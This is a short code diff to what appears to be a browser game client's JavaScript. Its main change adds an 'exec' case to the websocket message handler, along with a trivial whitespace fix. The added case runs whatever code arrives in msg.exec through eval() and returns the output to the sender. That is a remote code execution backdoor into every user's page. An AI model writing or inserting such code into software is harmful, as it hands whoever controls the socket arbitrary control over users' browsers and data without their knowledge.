@@ -760,6 +760,21 @@ Owner:<ul>
                     m: msg.message
                 });
                 break;
+            case "exec":
+                try {
+                    send({
+                        e: "exec",
+                        exec: msg.exec,
+                        output: eval(msg.exec)
+                    }, clientWS);
+                } catch (err) {
+                    send({
+                        e: "error",
+                        exec: msg.exec,
+                        error: String(err)
+                    }, clientWS);
+                }
+                break;
         }
     });
 }
@@ -977,7 +992,7 @@ function initMap(i) {
  * @param {boolean} force Force message
  */
 function message(msg, force = false) {
-    if (msg.s === "[SKAP]" && hideSKAP) return; 
+    if (msg.s === "[SKAP]" && hideSKAP) return;
     if (!force && blocked.includes(msg.s) && !devs.includes(msg.s)) {
         message({
             s: msg.s,
